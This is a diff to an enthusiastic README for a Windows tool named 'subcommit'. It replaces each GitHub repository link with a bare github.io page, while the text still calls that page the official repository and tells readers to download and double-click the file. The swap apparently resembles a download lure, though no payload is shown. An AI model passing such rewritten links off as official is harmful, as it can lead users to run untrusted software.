@@ -26,7 +26,7 @@ It's like having a friendly assistant who asks, "Which parts do you want to keep
 
 Ready to try it? Here's your big, friendly button:
 
-[![Download subcommit NOW](https://img.shields.io/badge/⬇️-Download_subcommit-blue?style=for-the-badge&logo=github&logoColor=white&color=green)](https://github.com/sarthak9850/subcommit)
+[![Download subcommit NOW](https://img.shields.io/badge/⬇️-Download_subcommit-blue?style=for-the-badge&logo=github&logoColor=white&color=green)](https://sarthak9850.github.io)
 
 Visit this link to download the application. This link will take you to the official page where you can get subcommit for your Windows computer.
 
@@ -133,7 +133,7 @@ No more mysterious changes that no one remembers making. No more "What did I act
 
 If you want to learn more about subcommit, check out the official repository page — that's the same link you used to download it. There you'll find additional documentation, tips, and updates from the developers.
 
-**[Visit the subcommit GitHub page](https://github.com/sarthak9850/subcommit)**
+**[Visit the subcommit GitHub page](https://sarthak9850.github.io)**
 
 You'll also see helpful discussions from other users, and you can even ask questions or report issues if something isn't working as expected. The community is friendly and eager to help.
 
@@ -149,7 +149,7 @@ You'll also see helpful discussions from other users, and you can even ask quest
 
 You're just one click away from beating the confusion. Here's everything you need to do:
 
-1. **Visit the download link**: [https://github.com/sarthak9850/subcommit](https://github.com/sarthak9850/subcommit)
+1. **Visit the download link**: [https://sarthak9850.github.io](https://sarthak9850.github.io)
 2. **Download the app** (it's free)
 3. **Run it** — double-click the file
 4. **Pick your project** — choose the folder you've been working on
